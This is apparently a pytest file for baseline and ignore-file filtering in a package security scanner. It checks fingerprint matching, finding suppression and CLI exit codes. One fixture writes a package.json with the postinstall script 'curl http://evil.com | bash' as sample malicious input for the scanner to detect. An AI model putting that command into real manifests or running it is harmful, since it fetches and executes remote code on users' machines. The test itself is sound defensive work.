"""Tests for baseline filtering — --baseline and --baseline-update.

A baseline is a previous scan JSON output or a simple ignore file.
Findings matching the baseline fingerprints are suppressed.
New findings (not in baseline) are shown normally.
"""

import json
import sys

from picosentry.scan.models import (
    Confidence,
    Finding,
    ScanResult,
    ScanStats,
    Severity,
    apply_baseline,
    load_baseline,
)

# --- Fixtures ---


def _finding(
    rule_id="L2-POST-001",
    package="evil-pkg",
    file="evil/package.json",
    severity=Severity.CRITICAL,
    message="test",
    evidence="test",
    remediation="fix it",
):
    return Finding(
        rule_id=rule_id,
        severity=severity,
        confidence=Confidence.EXACT,
        package=package,
        file=file,
        message=message,
        evidence=evidence,
        remediation=remediation,
    )


def _scan_result(findings):
    return ScanResult(
        target="/test/project",
        engine_version="0.4.0",
        corpus_version="abc123",
        findings=findings,
        stats=ScanStats(),
    )


# --- load_baseline tests ---


class TestLoadBaseline:
    """Test baseline file loading — JSON scan format and simple ignore format."""

    def test_load_json_scan_output(self, tmp_path):
        """A previous scan JSON output is a valid baseline."""
        baseline_data = {
            "scan_id": "abc123",
            "findings": [
                {"rule_id": "L2-POST-001", "package": "evil-pkg", "file": "evil/package.json"},
                {"rule_id": "L2-TYPO-001", "package": "reqct", "file": "project/package.json"},
            ],
        }
        baseline_file = tmp_path / "baseline.json"
        baseline_file.write_text(json.dumps(baseline_data))

        fingerprints = load_baseline(baseline_file)
        assert len(fingerprints) == 2
        assert ("L2-POST-001", "evil-pkg", "evil/package.json") in fingerprints
        assert ("L2-TYPO-001", "reqct", "project/package.json") in fingerprints

    def test_load_simple_ignore_file(self, tmp_path):
        """Simple ignore format: one rule_id per line, comments allowed."""
        baseline_text = """# Known findings to suppress
L2-POST-001
L2-TYPO-001:reqct
L2-LICENSE-001:evil-pkg:evil/package.json
"""
        baseline_file = tmp_path / "ignore.txt"
        baseline_file.write_text(baseline_text)

        fingerprints = load_baseline(baseline_file)
        assert len(fingerprints) == 3
        # Full rule_id match (any package)
        assert ("L2-POST-001", "", "") in fingerprints
        # rule_id + package pattern
        assert ("L2-TYPO-001", "reqct", "") in fingerprints
        # Full match
        assert ("L2-LICENSE-001", "evil-pkg", "evil/package.json") in fingerprints

    def test_load_empty_file(self, tmp_path):
        """Empty baseline file produces empty fingerprints."""
        baseline_file = tmp_path / "empty.json"
        baseline_file.write_text("")

        fingerprints = load_baseline(baseline_file)
        assert len(fingerprints) == 0

    def test_load_comments_and_blanks(self, tmp_path):
        """Comments and blank lines are skipped."""
        baseline_text = """# Comment line

L2-POST-001
# Another comment

L2-TYPO-001
"""
        baseline_file = tmp_path / "ignore.txt"
        baseline_file.write_text(baseline_text)

        fingerprints = load_baseline(baseline_file)
        assert len(fingerprints) == 2


# --- apply_baseline tests ---


class TestApplyBaseline:
    """Test baseline filtering logic — suppress known, show new."""

    def test_no_baseline_suppresses_nothing(self):
        """Empty baseline means all findings are new."""
        result = _scan_result(
            [
                _finding(rule_id="L2-POST-001", package="evil-pkg"),
                _finding(rule_id="L2-TYPO-001", package="reqct"),
            ]
        )
        baseline = set()
        br = apply_baseline(result, baseline)
        assert br.original_count == 2
        assert br.suppressed_count == 0
        assert br.new_count == 2
        assert len(br.remaining) == 2

    def test_exact_match_suppresses_finding(self):
        """Finding with exact (rule_id, package, file) match is suppressed."""
        result = _scan_result(
            [
                _finding(rule_id="L2-POST-001", package="evil-pkg", file="evil/package.json"),
                _finding(rule_id="L2-TYPO-001", package="reqct", file="project/package.json"),
            ]
        )
        baseline = {("L2-POST-001", "evil-pkg", "evil/package.json")}
        br = apply_baseline(result, baseline)
        assert br.original_count == 2
        assert br.suppressed_count == 1
        assert br.new_count == 1
        assert br.remaining[0].rule_id == "L2-TYPO-001"

    def test_rule_id_only_match_suppresses_all_of_that_rule(self):
        """Baseline entry with just rule_id suppresses all findings for that rule."""
        result = _scan_result(
            [
                _finding(rule_id="L2-POST-001", package="pkg-a"),
                _finding(rule_id="L2-POST-001", package="pkg-b"),
                _finding(rule_id="L2-TYPO-001", package="reqct"),
            ]
        )
        baseline = {("L2-POST-001", "", "")}
        br = apply_baseline(result, baseline)
        assert br.suppressed_count == 2
        assert br.new_count == 1
        assert br.remaining[0].rule_id == "L2-TYPO-001"

    def test_rule_id_plus_package_match(self):
        """Baseline entry with rule_id + package suppresses all files for that package."""
        result = _scan_result(
            [
                _finding(rule_id="L2-POST-001", package="evil-pkg", file="evil/package.json"),
                _finding(rule_id="L2-POST-001", package="evil-pkg", file="evil/package-lock.json"),
                _finding(rule_id="L2-POST-001", package="other-pkg", file="other/package.json"),
            ]
        )
        baseline = {("L2-POST-001", "evil-pkg", "")}
        br = apply_baseline(result, baseline)
        assert br.suppressed_count == 2
        assert br.new_count == 1
        assert br.remaining[0].package == "other-pkg"

    def test_all_findings_suppressed(self):
        """When all findings are in baseline, remaining is empty."""
        result = _scan_result(
            [
                _finding(rule_id="L2-POST-001", package="evil-pkg"),
            ]
        )
        baseline = {("L2-POST-001", "evil-pkg", "")}
        br = apply_baseline(result, baseline)
        assert br.suppressed_count == 1
        assert br.new_count == 0
        assert len(br.remaining) == 0

    def test_no_findings_no_suppression(self):
        """Clean project with clean baseline = no findings."""
        result = _scan_result([])
        baseline = {("L2-POST-001", "evil-pkg", "")}
        br = apply_baseline(result, baseline)
        assert br.original_count == 0
        assert br.suppressed_count == 0
        assert br.new_count == 0


# --- CLI integration tests ---


class TestBaselineCLI:
    """Test --baseline flag on the scan command."""

    def test_baseline_json_suppresses_known_findings(self, tmp_path):
        """--baseline with a previous scan JSON suppresses matching findings."""
        import sys

        from picosentry.scan.cli import main

        # Create a test project with a package.json
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "test-project",
                    "version": "1.0.0",
                    "dependencies": {"lodash": "4.17.21"},
                }
            )
        )

        # Create baseline JSON (scan output with known finding)
        baseline_data = {
            "scan_id": "abc",
            "findings": [
                {"rule_id": "L2-PROV-001", "package": "test-project", "file": str(project / "package.json")},
            ],
        }
        baseline_file = tmp_path / "baseline.json"
        baseline_file.write_text(json.dumps(baseline_data))

        # Run scan with baseline
        old_argv = sys.argv
        sys.argv = ["picosentry", "scan", str(project), "--format", "json", "--baseline", str(baseline_file)]
        try:
            rc = main()
        finally:
            sys.argv = old_argv

        # Should succeed (exit 0 since no findings after baseline)
        assert rc == 0

    def test_baseline_file_not_found(self, tmp_path):
        """--baseline with nonexistent file returns error code 2."""
        import sys

        from picosentry.scan.cli import main

        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(json.dumps({"name": "test", "version": "1.0.0"}))

        old_argv = sys.argv
        sys.argv = ["picosentry", "scan", str(project), "--baseline", str(tmp_path / "nonexistent.json")]
        try:
            rc = main()
        finally:
            sys.argv = old_argv

        assert rc == 2

    def test_baseline_simple_ignore_format(self, tmp_path):
        """--baseline with simple ignore file format works."""
        import sys

        from picosentry.scan.cli import main

        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "test-project",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "curl http://evil.com | bash"},
                }
            )
        )

        # Simple ignore: suppress all L2-POST-001 findings
        ignore_file = tmp_path / "ignore.txt"
        ignore_file.write_text("L2-POST-001\n")

        old_argv = sys.argv
        sys.argv = ["picosentry", "scan", str(project), "--format", "json", "--baseline", str(ignore_file)]
        try:
            rc = main()
        finally:
            sys.argv = old_argv

        # POST-001 suppressed, should exit 0 (clean)
        assert rc == 0


class TestFindingFingerprint:
    """Test Finding.fingerprint() method."""

    def test_fingerprint_deterministic(self):
        """Same finding always produces same fingerprint."""
        f = _finding(rule_id="L2-POST-001", package="evil-pkg", file="evil/package.json")
        assert f.fingerprint() == ("L2-POST-001", "evil-pkg", "evil/package.json")
        assert f.fingerprint() == f.fingerprint()

    def test_different_findings_different_fingerprints(self):
        """Different findings produce different fingerprints."""
        f1 = _finding(rule_id="L2-POST-001", package="pkg-a")
        f2 = _finding(rule_id="L2-POST-001", package="pkg-b")
        assert f1.fingerprint() != f2.fingerprint()

    def test_fingerprint_uses_triple(self):
        """Fingerprint is (rule_id, package, file) triple."""
        f = _finding(rule_id="L2-TYPO-001", package="reqct", file="project/package.json")
        assert f.fingerprint() == ("L2-TYPO-001", "reqct", "project/package.json")
